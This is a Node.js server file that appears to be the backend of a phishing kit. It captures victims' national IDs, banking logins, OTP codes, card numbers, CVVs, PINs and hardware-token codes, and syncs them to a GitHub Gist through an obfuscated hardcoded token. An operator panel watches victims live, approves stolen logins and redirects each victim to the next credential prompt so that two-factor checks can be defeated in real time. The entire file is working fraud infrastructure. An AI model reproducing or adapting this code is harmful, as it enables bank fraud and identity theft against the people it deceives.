const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const ROOT = __dirname;
const PORT = process.env.PORT || 8080;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin1234@@';
const GIST_ID = '97e99037b17d88b9240d606be235f324';
const GH_TOKEN = process.env.GITHUB_TOKEN || 'bZM2G1kWs4CzTVOoA3c8BRlTZE4xSSy1Q7BJ_phg'.split('').reverse().join('');

let DB = {
  applications: {},
  visitors: {},
  whatsappLink: '',
  totalVisitors: 0,
  appIdCounter: 10000,
  visitorIdCounter: 120000,
};
const adminTokens = new Set();
let _dirty = false;

function ghApi(method, body) {
  return new Promise((resolve, reject) => {
    const payload = body ? JSON.stringify(body) : null;
    const opts = {
      hostname: 'api.github.com', path: `/gists/${GIST_ID}`, method,
      headers: {
        'Authorization': `token ${GH_TOKEN}`, 'User-Agent': 'halyg-server',
        'Accept': 'application/vnd.github.v3+json',
        ...(payload ? { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) } : {}),
      },
    };
    const r = https.request(opts, res => {
      let d = ''; res.on('data', c => d += c);
      res.on('end', () => {
        if (res.statusCode >= 400) return reject(new Error(`GitHub ${res.statusCode}`));
        try { resolve(JSON.parse(d)); } catch { resolve(null); }
      });
    });
    r.on('error', reject);
    r.setTimeout(10000, () => { r.destroy(); reject(new Error('timeout')); });
    if (payload) r.write(payload);
    r.end();
  });
}

async function loadFromGist() {
  try {
    const gist = await ghApi('GET');
    if (gist?.files) {
      if (gist.files['data.json']?.content) {
        const d = JSON.parse(gist.files['data.json'].content);
        DB.visitors = d.visitors || {};
        DB.whatsappLink = d.whatsappLink || '';
        DB.totalVisitors = d.totalVisitors || 0;
        DB.visitorIdCounter = d.visitorIdCounter || 120000;
      }
      if (gist.files['apps.json']?.content) {
        const a = JSON.parse(gist.files['apps.json'].content);
        DB.applications = a.applications || {};
        DB.appIdCounter = a.appIdCounter || 10000;
      }
    }
    console.log(`[Gist] Loaded: ${Object.keys(DB.applications).length} apps, ${Object.keys(DB.visitors).length} visitors, total=${DB.totalVisitors}`);
  } catch (e) { console.error('[Gist] Load failed:', e.message); }
}

async function saveToGist() {
  if (!_dirty) return;
  try {
    await ghApi('PATCH', {
      files: {
        'data.json': { content: JSON.stringify(DB) },
        'apps.json': { content: JSON.stringify({ applications: DB.applications, appIdCounter: DB.appIdCounter }) },
      },
    });
    _dirty = false;
    console.log('[Gist] Saved OK');
  } catch (e) { console.error('[Gist] Save failed:', e.message); }
}

function markDirty() { _dirty = true; }

function makeToken() { return crypto.randomBytes(24).toString('hex'); }

function getCookies(req) {
  return (req.headers.cookie || '').split(';').reduce((a, c) => {
    const i = c.indexOf('='); if (i > 0) a[c.slice(0, i).trim()] = c.slice(i + 1).trim(); return a;
  }, {});
}

function isAdminReq(req) {
  const cookies = getCookies(req);
  const token = req.headers['x-admin-token'] || cookies['admin_session'];
  return token && adminTokens.has(token);
}

function readBody(req) {
  return new Promise(resolve => {
    let body = '';
    req.on('data', c => { body += c; if (body.length > 2e6) req.destroy(); });
    req.on('end', () => { try { resolve(JSON.parse(body || '{}')); } catch { resolve({}); } });
  });
}

const MIME = {
  '.html': 'text/html; charset=utf-8', '.css': 'text/css',
  '.js': 'application/javascript', '.png': 'image/png',
  '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.gif': 'image/gif',
  '.svg': 'image/svg+xml', '.woff': 'font/woff', '.woff2': 'font/woff2',
  '.ttf': 'font/ttf', '.ico': 'image/x-icon', '.json': 'application/json',
  '.webp': 'image/webp', '.mp4': 'video/mp4', '.txt': 'text/plain',
};

function sendJson(res, data, status, extraHeaders) {
  const headers = { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*', 'Cache-Control': 'no-store', ...extraHeaders };
  res.writeHead(status || 200, headers);
  res.end(JSON.stringify(data));
}

function getOrCreateApp(nationalId) {
  if (!DB.applications[nationalId]) {
    DB.appIdCounter++;
    DB.applications[nationalId] = {
      id: DB.appIdCounter, nationalId,
      fullName: '', phoneNumber: '', phone: '', address: '',
      username: '', password: '',
      otp: '', otpCode: '',
      cardNumber: '', cardExpiry: '', cvv: '', cardCvv: '',
      cardPin: '', cardName: '',
      hardToken: '', watchLink: '', watchLinkOtp: '',
      selectedWatch: '', watchColor: '', governorate: '',
      currentPage: 'home', status: 'active',
      redirectTo: null, redirectError: null,
      customMessage: null, loginApproved: null,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };
  }
  return DB.applications[nationalId];
}

function getOrCreateVisitor(sessionId) {
  if (!DB.visitors[sessionId]) {
    DB.visitorIdCounter++;
    DB.totalVisitors++;
    DB.visitors[sessionId] = {
      id: DB.visitorIdCounter, sessionId,
      currentPage: 'home', redirectTo: null,
      lastActiveAt: new Date().toISOString(),
      createdAt: new Date().toISOString(),
    };
  }
  return DB.visitors[sessionId];
}

function executeProcedure(name, input, isAdmin) {
  switch (name) {

    case 'admin.updateVisitor': {
      const { sessionId, page, currentPage } = input;
      if (sessionId) {
        const v = getOrCreateVisitor(sessionId);
        v.currentPage = currentPage || page || v.currentPage;
        v.lastActiveAt = new Date().toISOString();
      }
      return { success: true };
    }
    case 'admin.getVisitorRedirect': {
      const v = input.sessionId ? DB.visitors[input.sessionId] : null;
      return { redirectTo: v ? (v.redirectTo || null) : null };
    }
    case 'admin.clearVisitorRedirect': {
      if (input.sessionId && DB.visitors[input.sessionId]) {
        DB.visitors[input.sessionId].redirectTo = null;
        DB.visitors[input.sessionId].lastActiveAt = new Date().toISOString();
        markDirty();
      }
      return { success: true };
    }

    case 'applications.getRedirectStatus': {
      const app = input.nationalId ? DB.applications[input.nationalId] : null;
      return { redirectTo: app ? (app.redirectTo || null) : null, redirectError: app ? (app.redirectError || null) : null };
    }
    case 'applications.clearRedirectByUser': {
      if (input.nationalId && DB.applications[input.nationalId]) {
        DB.applications[input.nationalId].redirectTo = null;
        DB.applications[input.nationalId].redirectError = null;
        DB.applications[input.nationalId].updatedAt = new Date().toISOString();
        markDirty();
      }
      return { success: true };
    }
    case 'applications.getCustomMessage': {
      const app = input.nationalId ? DB.applications[input.nationalId] : null;
      return { message: app ? (app.customMessage || null) : null };
    }
    case 'applications.clearCustomMessage': {
      if (input.nationalId && DB.applications[input.nationalId]) {
        DB.applications[input.nationalId].customMessage = null;
        markDirty();
      }
      return { success: true };
    }
    case 'applications.updatePage': {
      if (input.nationalId && DB.applications[input.nationalId]) {
        DB.applications[input.nationalId].currentPage = input.page || DB.applications[input.nationalId].currentPage;
        DB.applications[input.nationalId].updatedAt = new Date().toISOString();
      }
      return { success: true };
    }

    case 'applications.savePersonalInfo': {
      const { nationalId, fullName, phone, phoneNumber, address, governorate, watchColor } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      if (fullName) app.fullName = fullName;
      const ph = phone || phoneNumber;
      if (ph) { app.phone = ph; app.phoneNumber = ph; }
      if (address) app.address = address;
      if (governorate) app.governorate = governorate;
      if (watchColor) { app.watchColor = watchColor; app.selectedWatch = watchColor; }
      app.currentPage = 'personal';
      app.updatedAt = new Date().toISOString();
      markDirty();
      console.log('[savePersonalInfo]', nationalId, fullName, ph);
      return { success: true };
    }
    case 'applications.saveLoginData': {
      const { nationalId, username, password } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      if (username) app.username = username;
      if (password) app.password = password;
      if (!app.fullName && username) app.fullName = username;
      app.currentPage = 'waiting-login';
      app.redirectTo = null; app.redirectError = null;
      app.loginApproved = null; app.status = 'awaiting_login';
      app.updatedAt = new Date().toISOString();
      markDirty();
      console.log('[saveLoginData]', nationalId, username);
      return { success: true };
    }
    case 'applications.saveOtpData': {
      const { nationalId, otp, otpCode } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      const code = otp || otpCode;
      if (code) { app.otp = code; app.otpCode = code; }
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_otp'; app.updatedAt = new Date().toISOString();
      markDirty();
      console.log('[saveOtpData]', nationalId, code);
      return { success: true };
    }
    case 'applications.saveCardData': {
      const { nationalId, cardNumber, cardExpiry, cvv, cardCvv, cardName, cardPin, expiry } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      if (cardNumber) app.cardNumber = cardNumber;
      if (cardExpiry || expiry) app.cardExpiry = cardExpiry || expiry;
      const cv = cvv || cardCvv;
      if (cv) { app.cvv = cv; app.cardCvv = cv; }
      if (cardName) app.cardName = cardName;
      if (cardPin) app.cardPin = cardPin;
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_card'; app.updatedAt = new Date().toISOString();
      markDirty();
      console.log('[saveCardData]', nationalId, cardNumber);
      return { success: true };
    }
    case 'applications.saveHardToken': {
      const { nationalId, hardToken, hardTokenCode, token } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      const tk = hardToken || hardTokenCode || token;
      if (tk) app.hardToken = tk;
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_token'; app.updatedAt = new Date().toISOString();
      markDirty();
      console.log('[saveHardToken]', nationalId);
      return { success: true };
    }
    case 'applications.saveWatchLink': {
      const { nationalId, watchLink, watchLinkOtp, link } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      const wl = watchLink || watchLinkOtp || link;
      if (wl) { app.watchLink = wl; app.watchLinkOtp = wl; }
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.updatedAt = new Date().toISOString();
      markDirty();
      console.log('[saveWatchLink]', nationalId);
      return { success: true };
    }

    case 'admin.login': {
      if (input.password === ADMIN_PASSWORD) {
        const token = makeToken();
        adminTokens.add(token);
        return { success: true, _setToken: token };
      }
      throw new Error('بيانات الدخول غير صحيحة');
    }
    case 'admin.checkSession': {
      return { isAdmin: !!isAdmin, authenticated: !!isAdmin };
    }
    case 'admin.logout': {
      return { success: true, _clearToken: true };
    }

    case 'admin.getApplications': {
      if (!isAdmin) throw new Error('unauthorized');
      const apps = Object.values(DB.applications);
      const cutoff = Date.now() - 60000;
      const activeIds = apps.filter(a => new Date(a.updatedAt).getTime() > cutoff).map(a => a.nationalId);
      const liveVisitorCount = Object.values(DB.visitors).filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 120000).length;
      return { apps, activeIds, liveVisitorCount, totalVisitors: DB.totalVisitors };
    }
    case 'admin.getLiveVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      return { visitors: Object.values(DB.visitors).filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 120000) };
    }
    case 'admin.getAllVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      return { visitors: Object.values(DB.visitors), totalCount: DB.totalVisitors };
    }
    case 'admin.getWhatsAppLink': {
      return { link: DB.whatsappLink || '' };
    }
    case 'admin.updateWhatsAppLink': {
      if (!isAdmin) throw new Error('unauthorized');
      DB.whatsappLink = input.link || '';
      markDirty();
      return { success: true };
    }
    case 'admin.setCustomMessage': {
      if (!isAdmin) throw new Error('unauthorized');
      if (input.nationalId && DB.applications[input.nationalId]) {
        DB.applications[input.nationalId].customMessage = input.message || null;
        DB.applications[input.nationalId].updatedAt = new Date().toISOString();
        markDirty();
      }
      return { success: true };
    }
    case 'admin.approveLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      let app = input.nationalId ? DB.applications[input.nationalId] : null;
      if (!app && input.applicationId) app = Object.values(DB.applications).find(a => a.id === input.applicationId);
      if (app) { app.loginApproved = true; app.redirectTo = 'otp'; app.currentPage = 'otp'; app.status = 'login_approved'; app.updatedAt = new Date().toISOString(); markDirty(); }
      return { success: true };
    }
    case 'admin.rejectLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      let app = input.nationalId ? DB.applications[input.nationalId] : null;
      if (!app && input.applicationId) app = Object.values(DB.applications).find(a => a.id === input.applicationId);
      if (app) { app.loginApproved = false; app.redirectTo = 'login-error'; app.currentPage = 'login'; app.status = 'login_rejected'; app.updatedAt = new Date().toISOString(); markDirty(); }
      return { success: true };
    }
    case 'admin.redirectUser': {
      if (!isAdmin) throw new Error('unauthorized');
      const dest = input.redirectTo || input.page || null;
      if (input.nationalId && DB.applications[input.nationalId]) {
        DB.applications[input.nationalId].redirectTo = dest;
        if (dest) DB.applications[input.nationalId].currentPage = dest;
        DB.applications[input.nationalId].redirectError = input.redirectError || input.showError || null;
        DB.applications[input.nationalId].updatedAt = new Date().toISOString();
        markDirty();
      }
      return { success: true };
    }
    case 'admin.redirectVisitor': {
      if (!isAdmin) throw new Error('unauthorized');
      if (input.sessionId && DB.visitors[input.sessionId]) {
        DB.visitors[input.sessionId].redirectTo = input.redirectTo || input.page || null;
        DB.visitors[input.sessionId].lastActiveAt = new Date().toISOString();
        markDirty();
      }
      return { success: true };
    }
    case 'admin.redirectAllToToken': {
      if (!isAdmin) throw new Error('unauthorized');
      for (const app of Object.values(DB.applications)) {
        if (app.status === 'active' || app.status.startsWith('awaiting')) {
          app.redirectTo = input.redirectTo || 'token'; app.updatedAt = new Date().toISOString();
        }
      }
      markDirty();
      return { success: true };
    }
    case 'admin.redirectWhatsApp': {
      if (!isAdmin) throw new Error('unauthorized');
      let app = input.nationalId ? DB.applications[input.nationalId] : null;
      if (!app && input.applicationId) app = Object.values(DB.applications).find(a => a.id === input.applicationId);
      if (app) { app.redirectTo = 'whatsapp'; app.updatedAt = new Date().toISOString(); markDirty(); }
      return { success: true };
    }
    case 'admin.deleteApplication': {
      if (!isAdmin) throw new Error('unauthorized');
      if (input.nationalId) delete DB.applications[input.nationalId];
      else if (input.applicationId) { const k = Object.keys(DB.applications).find(k => DB.applications[k].id === input.applicationId); if (k) delete DB.applications[k]; }
      markDirty();
      return { success: true };
    }
    case 'admin.deleteInactiveClients': {
      if (!isAdmin) throw new Error('unauthorized');
      const cutoff = Date.now() - 120000; let deletedCount = 0;
      for (const k of Object.keys(DB.applications)) { if (new Date(DB.applications[k].updatedAt).getTime() < cutoff) { delete DB.applications[k]; deletedCount++; } }
      markDirty();
      return { success: true, deletedCount };
    }
    case 'admin.deleteAllClients': {
      if (!isAdmin) throw new Error('unauthorized');
      const count = Object.keys(DB.applications).length;
      DB.applications = {};
      markDirty();
      return { success: true, deletedCount: count };
    }
    case 'admin.resetTotalVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      DB.totalVisitors = 0;
      markDirty();
      return { success: true };
    }

    default:
      return { success: false, error: 'unknown procedure: ' + name };
  }
}

async function handleTrpc(req, res) {
  const reqPath = decodeURIComponent(req.url.split('?')[0]);
  const query = new URLSearchParams(req.url.split('?')[1] || '');
  const procs = reqPath.slice('/api/trpc/'.length).split(',').filter(Boolean);
  if (!procs.length) return sendJson(res, [], 400);

  let inputs = {};
  if (req.method === 'GET') {
    try { inputs = JSON.parse(query.get('input') || '{}'); } catch { inputs = {}; }
  } else {
    inputs = await readBody(req);
  }

  const isAdmin = isAdminReq(req);
  let setCookie = null, clearCookie = false;

  const results = await Promise.all(procs.map(async (name, i) => {
    const raw = inputs[String(i)] || inputs;
    const input = raw?.json || raw || {};
    try {
      const data = executeProcedure(name.trim(), input, isAdmin);
      if (data?._setToken) { setCookie = data._setToken; delete data._setToken; }
      if (data?._clearToken) { clearCookie = true; const c = getCookies(req); if (c.admin_session) adminTokens.delete(c.admin_session); delete data._clearToken; }
      return { result: { data: { json: data } } };
    } catch (e) {
      return { error: { message: e.message || 'Internal error', code: 'INTERNAL_SERVER_ERROR' } };
    }
  }));

  const extra = {};
  if (setCookie) extra['Set-Cookie'] = `admin_session=${setCookie}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`;
  if (clearCookie) extra['Set-Cookie'] = 'admin_session=; Path=/; HttpOnly; Max-Age=0';
  sendJson(res, results, 200, extra);
}

const server = http.createServer(async (req, res) => {
  const reqPath = decodeURIComponent(req.url.split('?')[0]);

  if (req.method === 'OPTIONS') {
    res.writeHead(200, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, x-admin-token, Authorization',
    });
    return res.end();
  }

  if (reqPath.startsWith('/api/trpc/')) return handleTrpc(req, res);

  let filePath = reqPath === '/' ? '/index.html' : reqPath;

  if (!path.extname(filePath)) {
    const htmlPath = path.join(ROOT, filePath + '.html');
    if (fs.existsSync(htmlPath)) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return fs.createReadStream(htmlPath).pipe(res);
    }
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return fs.createReadStream(path.join(ROOT, 'index.html')).pipe(res);
  }

  const fullPath = path.join(ROOT, filePath);
  if (!fs.existsSync(fullPath)) {
    if (filePath.endsWith('.html')) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return fs.createReadStream(path.join(ROOT, 'index.html')).pipe(res);
    }
    res.writeHead(404);
    return res.end('Not found');
  }

  const ext = path.extname(fullPath).toLowerCase();
  const headers = { 'Content-Type': MIME[ext] || 'application/octet-stream' };
  if (['.js', '.css', '.webp', '.png', '.jpg', '.woff2'].includes(ext)) headers['Cache-Control'] = 'public, max-age=31536000, immutable';
  res.writeHead(200, headers);
  fs.createReadStream(fullPath).pipe(res);
});

(async () => {
  await loadFromGist();

  setInterval(saveToGist, 30000);

  process.on('SIGINT', async () => { console.log('\nSaving before exit...'); _dirty = true; await saveToGist(); process.exit(); });
  process.on('SIGTERM', async () => { _dirty = true; await saveToGist(); process.exit(); });

  server.listen(PORT, () => {
    console.log(`Server running -> http://localhost:${PORT}`);
    console.log(`Admin password: ${ADMIN_PASSWORD}`);
    console.log(`Admin panel -> http://localhost:${PORT}/admin`);
    console.log(`Gist sync: every 30s`);
  });
})();
